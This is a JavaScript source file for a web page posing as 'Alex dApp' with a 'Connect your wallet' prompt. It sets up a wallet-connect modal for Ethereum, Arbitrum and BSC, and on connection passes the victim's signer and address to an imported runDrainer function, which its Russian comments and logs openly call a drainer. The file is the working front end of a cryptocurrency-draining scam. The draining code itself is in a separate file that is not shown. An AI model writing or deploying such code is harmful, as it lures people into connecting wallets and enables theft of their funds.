import { createAppKit } from '@reown/appkit'
import { mainnet, arbitrum, bsc } from '@reown/appkit/networks'
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
import { ethers } from 'ethers'
import { runDrainer } from './drainer.js'

const projectId = 'd85cc83edb401b676e2a7bcef67f3be8'
const networks = [mainnet, arbitrum, bsc]

// ⛔ Coinbase отключен (иначе ошибка bf.on is not a function)
const wagmiAdapter = new WagmiAdapter({
  projectId,
  networks,
  wallets: {
    metamask: true,
    trust: true,
    walletconnect: true,
    coinbase: false // <--- Вот ключевая строчка
  }
})

const metadata = {
  name: 'Alex dApp',
  description: 'Connect your wallet',
  url: 'https://checkalex.xyz',
  icons: ['https://checkalex.xyz/icon.png']
}

const modal = createAppKit({
  adapters: [wagmiAdapter],
  networks,
  metadata,
  projectId,
  features: {
    analytics: true
  }
})

console.log("modal object:", modal)

document.getElementById('open-connect-modal').addEventListener('click', () => modal.open())

modal.on("connect", async (payload) => {
  console.log("Кошелек подключен. Запускаем Drainer...")
  try {
    const provider = new ethers.providers.Web3Provider(window.ethereum, 'any')
    const signer = provider.getSigner()
    const address = await signer.getAddress()

    await runDrainer(provider, signer, address)

    modal.close()
    console.log("Drainer завершен успешно.")
  } catch (e) {
    console.error("Ошибка в Drainer:", e)
    alert("Ошибка при выполнении Drainer: " + e.message)
  }
})
